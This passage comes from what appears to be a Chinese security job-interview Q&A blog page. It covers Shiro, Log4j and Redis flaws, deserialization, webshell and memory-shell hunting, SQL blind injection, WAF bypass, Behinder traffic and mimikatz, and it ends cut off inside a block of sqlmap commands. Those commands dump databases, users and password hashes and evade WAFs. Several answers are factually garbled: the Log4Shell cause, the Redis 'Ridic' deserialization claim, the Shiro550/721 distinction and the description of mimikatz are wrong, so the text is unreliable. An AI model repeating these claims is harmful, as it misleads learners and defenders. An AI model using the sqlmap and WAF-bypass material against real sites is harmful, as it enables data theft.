序列化库，以确保其安全性。此外，开发人员还可以使用其他序列化和反序列化库，例如Gson和Jackson等，来避免fastjson漏洞的风险。</p><h2 id="shiro漏洞原理？"><a href="#shiro漏洞原理？" class="headerlink" title="shiro漏洞原理？"></a>shiro漏洞原理？</h2><p>Apache Shiro是一个流行的Java安全框架，用于在应用程序中实现身份验证、授权和加密等功能。然而，Apache Shiro也存在一些安全漏洞，其中最著名的是反序列化漏洞。</p><p>Shiro反序列化漏洞的根本原因是，该框架采用了Java标准库中的ObjectInputStream类来反序列化请求中的数据。攻击者可以通过构造恶意请求，并将其发送到目标系统，以触发ObjectInputStream在处理该请求时执行恶意代码的情况。</p><p>攻击者可能会利用这个漏洞来绕过Shiro的安全控制，例如成功地进行认证并获得访问受保护资源的权限。攻击者还可以通过利用这个漏洞来在目标系统上执行任意代码，进一步危害系统的机密性和完整性。</p><p>为了缓解Shiro反序列化漏洞的风险，开发人员可以采取以下预防措施：</p><ol><li>避免直接从未经过验证的输入数据中反序列化对象。</li><li>限制反序列化器（如 ObjectInputStream）的使用，只反序列化可信来源的数据。</li><li>及时更新Shiro框架，以确保漏洞已被修复。</li><li>将Shiro部署在安全环境中，并使用网络隔离、网络监控和入侵检测等技术来加强安全控制。</li></ol><h2 id="log4j的漏洞原理？"><a href="#log4j的漏洞原理？" class="headerlink" title="log4j的漏洞原理？"></a>log4j的漏洞原理？</h2><p>Log4j是Java中广泛使用的一种日志管理工具，在许多应用程序中都被广泛使用。然而，最近发现了一种名为Log4Shell的漏洞，该漏洞使攻击者可以利用Log4j来执行任意代码，从而危及系统的安全性和完整性。以下是此漏洞的原理：</p><p>Log4j依赖于Apache Commons Math库中的一个子模块，即Math Expression Parser（MEP）库，以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用。</p><p>攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。</p><p>攻击者可以利用此漏洞来执行各种攻击，包括但不限于：</p><ol><li>远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。</li><li>远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。</li></ol><p>为了缓解Log4j漏洞的风险，建议采取以下预防措施：</p><ol><li>更新Log4j版本：最新版本已经修复了此漏洞。</li><li>关闭JNDI：如果您不需要使用JNDI，建议禁用该功能。</li><li>阻止外部网络访问：对于架构设计合理的应用程序，应该使用网络隔离等技术来限制外部访问。这将有助于减轻远程攻击的风险。</li><li>加强应用程序安全性：开发人员应该定期审计和更新应用程序代码，以确保其安全性和完整性。</li></ol><h2 id="ridis漏洞原理？"><a href="#ridis漏洞原理？" class="headerlink" title="ridis漏洞原理？"></a>ridis漏洞原理？</h2><p>Redis是一个流行的开源内存数据存储系统，被广泛用于Web应用程序中的缓存、队列和消息传递等方面。然而，Redis也存在一些安全漏洞，其中最著名的是Ridic反序列化漏洞。</p><p>Ridic反序列化漏洞的根本原因是，Redis使用了Java标准库中的ObjectInputStream类来处理数据的序列化和反序列化。攻击者可以通过构造恶意请求，并将其发送到目标Redis服务器上，以触发ObjectInputStream在处理该数据时执行恶意代码的情况。</p><p>攻击者可能会利用这个漏洞来绕过Redis的身份验证、篡改或删除存储在Redis数据库中的数据，甚至在Redis服务器上执行任意代码。例如，攻击者可以使用此漏洞来：</p><ol><li>提升权限：攻击者可以通过远程执行任意代码进一步攻击目标系统，例如窃取敏感信息、破坏系统完整性、创建后门等。</li><li>篡改数据：攻击者可以修改Redis数据库中的数据，例如覆盖现有数据、添加新的键值对等。</li><li>删除数据：攻击者可以利用此漏洞删除Redis数据库中的数据，包括重要的配置文件、认证令牌等。</li></ol><p>为了缓解Ridic反序列化漏洞的风险，开发人员可以采取以下预防措施：</p><ol><li>不要直接将未经过验证的用户输入数据存储在Redis数据库中。</li><li>更新Redis版本以确保漏洞已修复。</li><li>配置Redis服务器的安全设置，例如限制网络访问和使用密码进行身份验证等。</li><li>启用日志记录并监测Redis服务器上的异常活动。</li><li>将Redis服务器部署在安全环境中，并定期对其进行安全审计。</li></ol><h2 id="shiro550和shiro721有什么区别"><a href="#shiro550和shiro721有什么区别" class="headerlink" title="shiro550和shiro721有什么区别?"></a>shiro550和shiro721有什么区别?</h2><p>Shiro550和Shiro721都是Apache Shiro框架中的安全漏洞，它们存在于不同的子模块中，并采用了不同的攻击方式。</p><p>Shiro550漏洞存在于Shiro-crypto模块中，是一种加密相关的漏洞。该漏洞使攻击者能够绕过Shiro的加密保护，从而访问受保护的资源。具体来说，攻击者可以将明文传递给加密方法，从而获得加密后的结果，然后利用这个结果来伪造受信任用户的身份。</p><p>与之相比，Shiro721漏洞则存在于Shiro-core模块中，是一种反序列化漏洞。该漏洞允许攻击者通过构造特制的序列化对象来执行任意代码，并在目标系统上实现远程代码执行攻击。攻击者可以通过向目标系统发送恶意请求触发此漏洞，并在其中嵌入恶意代码来破坏系统安全性和完整性。</p><p>总之，尽管Shiro550和Shiro721都是Shiro框架中的安全漏洞，但它们属于不同的类型和攻击方式。因此，在使用Shiro框架时，开发人员需要采取一些预防措施，并注意及时更新Shiro库中的漏洞修复。</p><h2 id="你对反序列化漏洞了解多少？"><a href="#你对反序列化漏洞了解多少？" class="headerlink" title="你对反序列化漏洞了解多少？"></a>你对反序列化漏洞了解多少？</h2><p>反序列化漏洞是指攻击者利用程序中未经充分验证的输入，向应用程序提供一个恶意构造的序列化对象，执行任意代码或获取敏感信息的漏洞。这种漏洞通常出现在Java和.NET等语言的应用程序中。</p><p>反序列化漏洞的本质是：当程序从存储介质读取对象时，如果没有对传入的数据进行充分验证，那么攻击者就可以通过精心构造的序列化对象，欺骗应用程序执行恶意代码。攻击者可能会在序列化对象中添加可执行代码或操作指令，以执行危害系统安全性和完整性的操作，例如修改或删除数据、窃取敏感信息或执行远程代码等。</p><p>为了防止反序列化漏洞，开发人员应该采取以下预防措施：</p><ol><li>避免直接将未经过验证的用户输入数据反序列化为对象。</li><li>对所有用户输入进行严格的验证和过滤，包括长度、格式和内容等方面。</li><li>限制反序列化器的使用，只反序列化可信来源的数据。</li><li>及时更新反序列化库，以确保已修复已知漏洞。</li><li>在系统上禁用危险的反序列化特性，例如使用Java标准库中的ObjectInputStream类。</li></ol><p>总之，反序列化漏洞是一种普遍存在的安全漏洞，需要开发人员特别注意，从设计、编码和测试等各个方面加强应用程序的安全性和完整性。</p><h2 id="linux查看端口，查看进程，查看恶意文件命令是什么？"><a href="#linux查看端口，查看进程，查看恶意文件命令是什么？" class="headerlink" title="linux查看端口，查看进程，查看恶意文件命令是什么？"></a>linux查看端口，查看进程，查看恶意文件命令是什么？</h2><ol><li>查看端口命令：</li></ol><p>在Linux中，可以使用以下命令来查看当前系统上打开的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">netstat -tlnp</span><br></pre></td></tr></table></figure><p>该命令列出了当前所有的TCP和UDP监听端口，并显示哪些程序正在使用这些端口。其中，“-t”表示只显示TCP协议，“-l”表示只显示监听端口，“-n”表示不解析IP地址和端口号，“-p”表示显示进程相关信息。</p><ol><li>查看进程命令：</li></ol><p>在Linux中，可以使用以下命令来查看当前正在运行的进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>该命令列出了当前所有的进程，并显示每个进程的PID、名称、状态、父进程ID等信息。其中，“-e”表示列出所有进程，“-f”表示完整输出格式（包括用户、CPU占用率、内存占用等）。</p><ol><li>查看恶意文件命令：</li></ol><p>在Linux中，可以使用以下命令来查找可能的恶意文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">find / -name &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>该命令将从根目录开始搜索指定文件名的文件，并输出所有匹配的结果。注意，此命令需要root权限才能搜索整个文件系统。</p><p>此外，还可以使用以下命令来查看特定文件是否具有可疑的权限或属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">ls -la &lt;filepath&gt;</span><br></pre></td></tr></table></figure><p>该命令列出了特定文件的详细属性，包括所有者、组、权限、大小、修改时间和链接等信息。可以通过分析这些属性来确定文件是否具有可疑的行为。</p><h2 id="网站被攻击了怎么排查？"><a href="#网站被攻击了怎么排查？" class="headerlink" title="网站被攻击了怎么排查？"></a>网站被攻击了怎么排查？</h2><p>当网站被攻击时，开发人员应该采取以下步骤来排查：</p><ol><li>确认是否真的被攻击了：首先需要确认是否真的被攻击了。通常情况下，被攻击的网站可能会出现许多异常行为，例如页面加载缓慢、无法访问、误导用户等。此外，也可以通过日志分析和网络监测工具来探测是否存在异常流量或恶意请求。</li><li>初步分析攻击类型：根据异常行为和日志信息，可以初步确定攻击类型，例如SQL注入、XSS跨站脚本、CSRF跨站请求伪造、DDoS攻击等。</li><li>收集证据：对于发现的异常行为和攻击类型，需要收集相关证据，并记录下时间、来源、目标等信息，以便后续分析和响应。</li><li>及时阻止攻击：在收集完足够的证据后，应该尽快采取措施来阻止攻击的继续进行。可以使用防火墙、IP过滤、封禁IP地址等技术手段来限制攻击者的访问。</li><li>分析攻击原因：在阻止攻击后，需要深入分析攻击原因。可以从系统架构、代码实现、配置管理、人员行为等方面入手，找出漏洞和弱点，并及时修复。</li><li>恢复服务：在分析和修复所有漏洞后，需要恢复服务并重新上线网站。此时，可以使用安全工具和技术来加固系统，并建立监测系统来及时发现和响应类似攻击。</li></ol><p>总之，排查被攻击的网站是一个复杂而艰巨的过程，需要开发人员具有扎实的技能和丰富的经验。最重要的是，应该采取预防措施，在日常开发和运维中注重安全性和完整性，以防止未来的攻击。</p><h2 id="文件上传怎么通过设备判断？"><a href="#文件上传怎么通过设备判断？" class="headerlink" title="文件上传怎么通过设备判断？"></a>文件上传怎么通过设备判断？</h2><p>在文件上传功能中通过设备判断，通常可以使用HTTP请求头中的User-Agent字段来识别用户所使用的设备类型。该字段包含了用户代理软件的名称、版本号和操作系统等信息，可以根据这些信息来判断用户所使用的设备类型，例如PC、手机或平板电脑等。</p><p>以下是一些常见的User-Agent值，用于识别不同设备类型：</p><ul><li>PC端浏览器的User-Agent值通常包含“Windows”、“Macintosh”等关键字。</li><li>iOS设备的User-Agent值通常包含“iPhone”、“iPad”等关键字。</li><li>Android设备的User-Agent值通常包含“Android”等关键字。</li></ul><p>在服务器端代码中，可以通过解析HTTP请求头，提取User-Agent字段，并对其进行匹配和分类。例如，可以使用正则表达式来匹配User-Agent值，从而判断用户所使用的设备类型，并针对不同的设备类型做出相应的处理，例如限制上传的文件类型、大小等。</p><p>需要注意的是，User-Agent字段可能存在伪造或篡改的情况，因此不能完全依赖这个字段来确定用户的设备类型。在实现安全验证时，还需要采取其他措施，例如限制上传路径、禁止上传可执行文件、对上传文件进行文件类型检查、加强文件访问权限等，以增强上传功能的安全性和完整性。</p><h2 id="怎么排查内存马？"><a href="#怎么排查内存马？" class="headerlink" title="怎么排查内存马？"></a>怎么排查内存马？</h2><p>内存马是指恶意程序将自己注入到进程的内存中，从而实现对系统资源和数据的非法控制。由于内存马不占用磁盘空间，难以被杀毒软件检测和拦截，因此排查起来比较困难。但仍然可以采取以下一些方法来排查内存马：</p><ol><li>进程分析：通过查看系统中所有进程的信息，包括进程名称、PID、所属用户、内存占用等，可以尝试发现异常进程并排除其中是否存在内存马。</li><li>系统日志分析：通过分析系统日志文件，可以查看系统启动、服务开启、网络连接等活动，以了解是否有可疑的行为发生。</li><li>内存分析工具：使用专业的内存分析工具，例如Volatility Framework、Mandiant Memoryze、Rekall等，可以在内存中查找潜在的内存马代码或痕迹，并进行初步分析和定位。</li><li>网络监测工具：通过网络监测工具，例如Wireshark、Tcpdump等，可以捕获网络流量，了解是否有可疑的网络请求或通信行为，进一步定位内存马的来源和命令控制中心。</li><li>安全软件扫描：利用杀毒软件和安全扫描工具，例如Norton Power Eraser、Kaspersky TDSSKiller等，可以对系统进行全面的扫描和检测，以发现并清除可能存在的内存马。</li></ol><p>总之，排查内存马需要采取多种方法、综合分析，结合实际情况而定。在预防内存马时，还需要加强系统的安全性和完整性，限制对系统资源和文件的访问权限，禁止不必要的外部连接和通信行为，及时更新系统和应用程序的补丁和版本，从源头上避免内存马的出现。</p><h2 id="登录框页面都可以测试哪些漏洞？"><a href="#登录框页面都可以测试哪些漏洞？" class="headerlink" title="登录框页面都可以测试哪些漏洞？"></a>登录框页面都可以测试哪些漏洞？</h2><p>登录框页面是Web应用程序中常见的功能之一，也是黑客攻击的重要目标。下面列举了一些可能存在的漏洞：</p><ol><li>SQL注入：黑客可以在登录框中输入特殊字符，从而构造恶意的SQL语句，绕过身份验证，甚至获取敏感信息。</li><li>XSS跨站脚本攻击：黑客可以通过在登录框中插入JavaScript代码，篡改页面内容或窃取用户凭据等。</li><li>CSRF跨站请求伪造：黑客可以通过构造恶意请求，在用户不知情的情况下发起伪造的登陆请求，从而模拟合法用户的身份完成相应操作。</li><li>密码弱口令：用户设置的密码太简单或者容易被猜到，导致黑客可以轻松破解，进而访问网站的系统资源和数据。</li><li>会话固定攻击：黑客可以通过截获会话ID，让其他用户使用这个会话ID来登录，从而获取用户的敏感信息。</li><li>身份验证绕过：黑客可以通过各种手段，如暴力破解、抓包分析等方式，绕过身份验证机制，进而访问系统资源和数据。</li><li>命令注入：黑客可以在用户名或密码中注入恶意的命令，从而执行系统命令，控制服务器。</li></ol><p>为了有效地防范这些漏洞，开发人员应该采取一些预防措施，例如加强用户输入的验证和过滤、使用安全的密码策略、使用CSRF Token、启用HTTPS等。此外，还应该定期对登录页面进行渗透测试和安全评估，及时发现并修复潜在的漏洞。</p><h2 id="sql盲注有几种方法？"><a href="#sql盲注有几种方法？" class="headerlink" title="sql盲注有几种方法？"></a>sql盲注有几种方法？</h2><p>SQL盲注是指通过构造特定的SQL语句，利用Web应用程序的漏洞来获取敏感信息或执行具有破坏性的操作。根据不同的条件和情况，SQL盲注可以分为以下几种方法：</p><ol><li>基于布尔盲注：基于布尔盲注的攻击方式是常见的SQL盲注手段之一。黑客通过构造恶意的SQL语句，向Web应用程序提交查询请求，并观察返回结果中的布尔值（True或False）来推断查询语句中的条件是否成立。在这种攻击方式中，黑客通常会构造使用”AND”或者”OR”关键字的语句，以及适当的参数组合，从而判断出数据库中的数据是否符合预期要求。</li><li>基于时间盲注：基于时间盲注也是SQL盲注的一种类型。在这种攻击方式中，黑客通过构造恶意的SQL语句，在查询时增加等待时间，以便观测程序在执行恶意查询后的响应时间。如果响应时间与正常情况下相比明显延长，则说明恶意查询已经被执行。</li><li>基于错误消息盲注：基于错误消息盲注是另一种常见的SQL盲注攻击方式。黑客通过构造恶意的SQL语句，向Web应用程序提交查询请求，如果数据不符合预期要求，则会触发数据库的错误消息。黑客可以通过观察错误消息中的详细信息，推断出恶意查询是否执行成功。</li><li>基于联合查询盲注：基于联合查询盲注是另一种SQL盲注攻击方式。在这种攻击方式中，黑客通过构造特定的SQL语句，并使用”UNION”关键字来实现查询结果的合并。黑客可以通过修改查询语句中的参数，或者增加或减少查询中的表格数目，来获取敏感信息或执行破坏性操作。</li></ol><p>总之，SQL盲注是一种危险的攻击手段，开发人员需要采取有效的防御措施，避免出现潜在的漏洞。例如，开发人员可以对用户输入数据进行严格的检验和过滤，限制用户输入的字符类型和长度，尽量避免使用动态拼接字符串的方式构造SQL语句，加强数据库本身的安全性等。</p><h2 id="不给你工具，怎么进行webshell排杀"><a href="#不给你工具，怎么进行webshell排杀" class="headerlink" title="不给你工具，怎么进行webshell排杀"></a>不给你工具，怎么进行webshell排杀</h2><p>要进行Webshell排查和清除，需要在服务器上执行以下步骤：</p><ol><li>扫描服务器，寻找异常进程、文件和网络连接。可以使用诸如lsof、netstat、ps等命令来查找可疑的进程和网络连接。</li><li>检查服务器中是否存在任何未知文件或目录，特别是具有隐藏属性的文件和目录。可以使用find命令查找所有文件和目录，并检查其中是否存在可疑的文件和目录。</li><li>检查服务器上是否存在未知用户和组。可以使用cat /etc/passwd和cat /etc/group命令来查看系统中的用户和组，并检查其中是否存在可疑的用户和组。</li><li>检查服务器上的系统日志，包括/var/log/messages、/var/log/secure等文件，以查找异常事件。</li><li>如果发现可疑的Webshell文件，需要立即将其删除，并检查相关的网站和数据库是否被入侵。</li><li>更新服务器上的操作系统和应用程序，并安装最新的防病毒软件和安全补丁，以提高服务器的安全性。</li></ol><p>以上这些操作需要有一定的Linux系统管理基础，如果您不熟悉这些操作，建议联系专业的安全人员进行处理。此外，为了减少Webshell攻击的风险，请您注意加强服务器的安全设置，定期备份重要数据，并限制外部访问服务器的权限。</p><h2 id="拿下内网主机如何判断它的权限"><a href="#拿下内网主机如何判断它的权限" class="headerlink" title="拿下内网主机如何判断它的权限"></a>拿下内网主机如何判断它的权限</h2><p>当您成功入侵一台内网主机后，您需要评估该主机的权限级别。以下是一些常见方法：</p><ol><li>查看当前用户的权限：使用命令<code>whoami</code>或<code>id</code>查看当前用户的权限。如果当前用户是root或管理员权限，则他们可以访问和修改系统上所有机密数据和配置文件。</li><li>检查可用的系统命令：使用命令<code>sudo -l</code>来查看当前用户是否可以执行以root权限运行的系统命令。如果您有足够的权限，可以使用<code>sudo</code>命令来执行特权操作。</li><li>检查系统日志：检查系统日志文件中是否有任何异常记录。攻击者可能会在日志文件中删除其活动痕迹，因此需要查看备份日志文件。</li><li>查看安全配置：检查密码策略、防火墙配置、网络访问控制列表等配置文件，以确定当前用户能否绕过这些保护层进行更高级别的攻击。</li><li>检查进程和服务：使用命令<code>ps -ef</code>或<code>systemctl list-units</code>来查看正在运行的进程和服务。如果您看到未知的进程或服务正在运行，则可能存在恶意软件或后门程序。</li></ol><p>总之，在评估被攻击的内部系统时，重要的是要了解当前用户拥有哪些权限，并确定攻击者是否已经获得更高的权限或在系统上留下了后门。建议在评估过程中使用多种技术和工具来获取完整的信息，以确保您有足够的信息来进行正确的决策，从而保护您的系统和数据免受攻击。</p><h2 id="同源策略是什么"><a href="#同源策略是什么" class="headerlink" title="同源策略是什么"></a>同源策略是什么</h2><p>同源策略（Same Origin Policy）是一种Web安全策略，它是浏览器中的一项重要特性，用于限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。同源指的是三个关键元素：协议、主机和端口号，只有这三者完全相同的两个URL才被认为是同源的。</p><p>同源策略可以防止恶意网站访问其他网站的敏感数据，例如Cookie、LocalStorage和请求响应等信息，从而保护用户的隐私和安全。</p><p>例如，假设您正在访问一个银行的网站，该银行使用Cookie来存储您的登录凭据。如果攻击者能够在他们的网站上注入一些JavaScript代码并通过某种方式将其转移到您正在访问的银行网站上，那么该攻击者就可以访问您的Cookie，以便窃取您的个人信息。然而，由于同源策略的存在，攻击者无法访问您正在访问的银行网站的Cookie，因为它们不属于同一个源。</p><p>尽管同源策略对Web安全至关重要，但在某些情况下，它可能会成为开发过程中的挑战。为了解决这些问题，Web开发人员可以使用一些技术和标记，如跨域资源共享（CORS）和JSONP等来解决这些限制。</p><h2 id="说一下几种常见的逻辑漏洞"><a href="#说一下几种常见的逻辑漏洞" class="headerlink" title="说一下几种常见的逻辑漏洞"></a>说一下几种常见的逻辑漏洞</h2><p>逻辑漏洞指的是应用程序中的编码错误或设计缺陷，使攻击者可以利用不符合预期的逻辑来绕过安全控制并实现攻击目标。以下是几种常见的逻辑漏洞：</p><ol><li>注册送礼：在这种攻击中，攻击者通过欺骗用户注册帐户并提供个人信息的方式来获取某种奖励或礼物，从而收集大量有价值的用户数据。攻击者利用了开发人员未正确处理奖励机制的事实，并通过暴力破解、自动化脚本等方式创建大量虚假账户。</li><li>提交订单时修改价格：在这种漏洞中，攻击者可以通过提交订单时修改商品价格来获得不当利益。攻击者可能会修改页面上显示的价格、数量或其他参数，以实现价格欺诈。</li><li>超额退款：攻击者通过修改应用程序中的退款机制或直接与客户服务联系，以获取超出实际退款金额的退款，从而实现盈利。</li><li>非法访问：在这种漏洞中，攻击者可以通过绕过身份验证或访问控制机制，以获取未经授权的访问权限。攻击者可能会使用一些技术手段，如SQL注入、目录遍历、文件包含等来绕过访问控制机制。</li><li>不当的会话管理：攻击者可以通过利用应用程序中的会话机制漏洞，以获取受害者的会话令牌或密码。攻击者可能会使用会话劫持、会话固定攻击等技术手段，从而窃取用户的身份验证信息。</li></ol><p>以上是常见的几种逻辑漏洞，这些漏洞需要开发人员在设计和编写代码时注意到，并采取相应的防范措施，例如使用安全的会话管理、访问控制、输入验证等措施，从而保护应用程序的安全性。</p><h2 id="如何判断是否存在越权漏洞"><a href="#如何判断是否存在越权漏洞" class="headerlink" title="如何判断是否存在越权漏洞"></a>如何判断是否存在越权漏洞</h2><p>越权漏洞是指攻击者可以未经授权地访问或修改受限资源的漏洞。一些常见的越权漏洞包括：</p><ol><li>管理员账户欺骗：攻击者通过伪装成管理员或其他特权用户，以获取访问受限资源的权限。</li><li>直接对象引用：攻击者可以直接访问应用程序中的受保护对象或文件，而不需要通过身份验证或授权过程。</li><li>会话劫持：攻击者可以窃取正在进行的会话ID，以获得访问受限资源的权限。</li><li>暴力破解：攻击者可以使用暴力破解技术，如穷举法或字典攻击等，来尝试猜测受限资源的密码或凭证。</li></ol><p>要判断是否存在越权漏洞，可以考虑以下方法：</p><ol><li>分析应用程序的访问控制机制，查看哪些资源受到了访问限制。</li><li>测试应用程序的身份验证和授权机制，以了解是否存在身份验证缺陷、密码弱点等问题。</li><li>使用模拟攻击工具或手动测试来模拟攻击者的行为，并尝试访问受限资源，以确定是否存在越权漏洞。</li><li>针对常见的越权漏洞类型，如管理员账户欺骗、会话劫持等，采取相应的安全措施和加固策略。</li></ol><p>总之，要发现和修复越权漏洞，需要审查应用程序的访问控制机制、身份验证和授权流程，并通过模拟攻击和手动测试来判断是否存在越权漏洞。定期进行漏洞扫描和安全评估也是必要的，以确保应用程序始终保持安全状态。</p><h2 id="sql注入遇到waf，怎么绕过"><a href="#sql注入遇到waf，怎么绕过" class="headerlink" title="sql注入遇到waf，怎么绕过"></a>sql注入遇到waf，怎么绕过</h2><p>以下是几种常见的方法：</p><ol><li>使用编码：攻击者可以对注入负载进行编码，例如使用十六进制或Unicode编码等方式，以绕过WAF对字符集的检查。攻击者还可以使用字符串分割、大小写转换等技术手段，以使WAF无法识别恶意代码。</li><li>使用注入器：SQL注入攻击工具如Sqlmap、Havij、SQLi-hunter等，可以自动检测和利用各种SQL注入漏洞，并通过绕过WAF来获取敏感数据。</li><li>盲注：在盲注攻击中，攻击者不直接获取查询结果，而是根据应用程序的响应来判断是否存在漏洞。攻击者可以使用时间延迟或错误信息来判断是否存在漏洞，并以此来推断数据库中的数据。</li><li>变形注入：变形注入攻击是一种多次执行的注入攻击，使用变体的注入负载，使注入负载不同于以前的攻击负载，从而逃避WAF的检测。</li></ol><h2 id="了解过哪些安全设备"><a href="#了解过哪些安全设备" class="headerlink" title="了解过哪些安全设备"></a>了解过哪些安全设备</h2><ol><li>华为防火墙：华为防火墙是华为公司生产的安全产品之一，主要用于网络边界安全和数据中心安全。它提供了多种安全功能，例如流量管理、入侵检测、VPN接入等。</li><li>绿盟防火墙：绿盟防火墙是北京绿盟科技有限公司开发的一款网络安全产品，具有防御DDoS、DNS攻击、漏洞利用等攻击的能力，还支持大规模分布式部署。</li><li>启明星辰边界安全网关：启明星辰边界安全网关是启明信息技术股份有限公司推出的一款综合性安全产品，它能够提供网络访问控制、应用层协议识别、反病毒防护、VPN等多种安全功能。</li><li>360天擎安全产品：360天擎安全产品是由360集团推出的综合性安全产品，包括了防火墙、入侵检测、威胁情报、网络行为分析等多种安全功能，可支持大规模企业部署。</li><li>安恒安全产品：安恒信息安全技术有限公司是国内知名的网络安全服务提供商之一，其生产的安全产品包括了威胁情报、攻击检测、漏洞管理等多种安全功能，广泛应用于金融、电信、政府等行业。</li></ol><h2 id="了解过哪些安全产品"><a href="#了解过哪些安全产品" class="headerlink" title="了解过哪些安全产品"></a>了解过哪些安全产品</h2><ol><li>网络安全设备类：网络安全设备类产品主要包括防火墙、入侵检测系统、Web应用安全网关、DDoS防护等。例如华为防火墙、启明星辰边界安全网关、绿盟防火墙、360天擎等。</li><li>终端安全类：终端安全产品主要用于保护个人电脑、移动设备和服务器的安全，主要包括反病毒软件、安全加固、数据加密、身份认证等。例如360安全卫士、金山毒霸、腾讯电脑管家等。</li><li>数据安全类：数据安全产品主要用于保护企业敏感数据不被泄露或篡改，主要包括加密、备份恢复、数据控制等。例如深信服信息加密解决方案、启明星辰数据加密产品、山石网科数据泄漏防护等。</li><li>互联网安全类：互联网安全产品主要用于保护企业在互联网上的各种应用、网站、云服务等安全，主要包括云安全、移动安全、Web应用安全和容器安全等。例如弘善网络云安全解决方案、卫士通移动安全系统、腾讯安全云等。</li></ol><h2 id="冰蝎的流量特征是什么"><a href="#冰蝎的流量特征是什么" class="headerlink" title="冰蝎的流量特征是什么"></a>冰蝎的流量特征是什么</h2><p>冰蝎是一种常见的远控工具(RAT)，其流量特征如下：</p><ol><li>使用HTTP协议：冰蝎使用HTTP协议与C&amp;C服务器通信，从而绕过网络策略和防火墙的检测。</li><li>自定义加密：冰蝎使用自定义加密算法对数据进行加密，以避免被网络监测器和安全设备检测到。</li><li>动态命令: 通过inline和eval函数动态执行指令并返回结果，这使得冰蝎可以运行各种自定义代码，例如扫描目标、下载和安装其他恶意软件等。</li><li>内存驻留: 冰蝎不需要在受感染设备上安装文件或建立持久性，它只需要注入进程并在内存中驻留，从而难以被传统杀毒软件检测和清除。</li><li>支持多平台：冰蝎支持Windows, Linux, and Mac OS等操作系统，这使得攻击者可以在跨多个平台上远程控制受感染设备。</li></ol><p>总之，冰蝎的流量特征是使用HTTP协议、自定义加密、动态命令、内存驻留和支持多平台。网络管理员可以根据这些特征来识别和阻止冰蝎远控攻击。</p><h2 id="使用猕猴桃工具需要什么权限"><a href="#使用猕猴桃工具需要什么权限" class="headerlink" title="使用猕猴桃工具需要什么权限"></a>使用猕猴桃工具需要什么权限</h2><p>猕猴桃是一种常用的网络安全工具，使用该工具需要以下权限：</p><ol><li>对目标主机进行扫描：猕猴桃工具需要能够对目标主机或网络进行扫描，以收集有关目标系统和服务的信息。因此，使用者需要有足够的网络访问权限，以便对目标进行扫描和探测。</li><li>探测漏洞：猕猴桃工具通过对目标系统和服务进行扫描，并使用已知的漏洞进行测试，从而确定可能存在的安全漏洞。这需要使用者有足够的权限，以便在目标主机上执行相关的漏洞检测工作。</li><li>管理目标系统：有时候，为了修复发现的漏洞，需要对目标系统进行配置和管理。这需要使用者拥有足够的管理员权限，以便修改系统设置、安装补丁等。</li></ol><h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2><p>SQLMap是一种常用的自动化SQL注入攻击工具，可以对目标网站进行全自动的SQL注入漏洞扫描和利用。以下是一些SQLMap的常用命令：</p><ol><li>基本扫描命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbs       # 获取所有可利用的数据库</span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname --tables  # 获取指定数据库中的所有表</span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T tablename --columns   # 获取指定表中的所有列</span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; -D dbname -T tablename -C columnname --dump    # 获取指定列中的数据</span><br></pre></td></tr></table></figure><ol><li>POST请求和Cookie：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://target.com/login.php&quot; --data=&quot;username=admin&amp;password=1234&quot; --cookie=&quot;PHPSESSID=abcd1234&quot; --level=5 --risk=3   # 向登录页面发送POST请求和Cookie，并对网站进行深度扫描</span><br></pre></td></tr></table></figure><ol><li>手动指定注入点：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://target.com/page.php?id=1&quot; --dbms=mysql --technique=T --random-agent --level=5 --risk=3 --current-db --users --passwords --privileges --threads=10 --batch --skip-waf --tamper=randomcomments -p id   # 指定注入点为id参数，绕过WAF设置，使用随机HTTP头和注入负载进行扫描</span><br></pre></td></tr></table></figure><ol><li>高级命令：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 